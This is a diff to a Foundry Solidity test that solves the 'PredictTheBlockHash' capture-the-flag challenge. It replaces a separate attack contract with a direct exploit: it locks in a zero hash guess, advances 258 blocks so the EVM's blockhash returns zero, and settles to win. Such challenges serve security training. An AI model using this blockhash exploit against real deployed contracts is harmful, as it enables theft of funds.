@@ -5,7 +5,6 @@ pragma experimental ABIEncoderV2;
 import { Test } from "forge-std/Test.sol";
 import { PredictTheBlockHashChallenge } from "../src/challenges/09_PredictTheBlockHash/PredictTheBlockHashChallenge.sol";
 import { PredictTheBlockHashChallengeFactory } from "../src/challenges/09_PredictTheBlockHash/PredictTheBlockHashChallengeFactory.sol";
-import { PredictTheBlockHashAttack } from "../src/attacks/PredictTheBlockHashAttack.sol";
 
 contract PredictTheBlockHashTest is Test {
     PredictTheBlockHashChallenge public challenge;
@@ -16,12 +15,14 @@ contract PredictTheBlockHashTest is Test {
     }
 
     function test() public {
-        PredictTheBlockHashAttack attacker = new PredictTheBlockHashAttack();
-
-        attacker.lockInGuess{ value: 1 ether }(challenge);
+        challenge.lockInGuess{ value: 1 ether }(
+            0x0000000000000000000000000000000000000000000000000000000000000000
+        );
         vm.roll(block.number + 258);
-        attacker.settle(challenge);
+        challenge.settle();
 
         assertTrue(challenge.isComplete());
     }
+
+    receive() external payable {}
 }
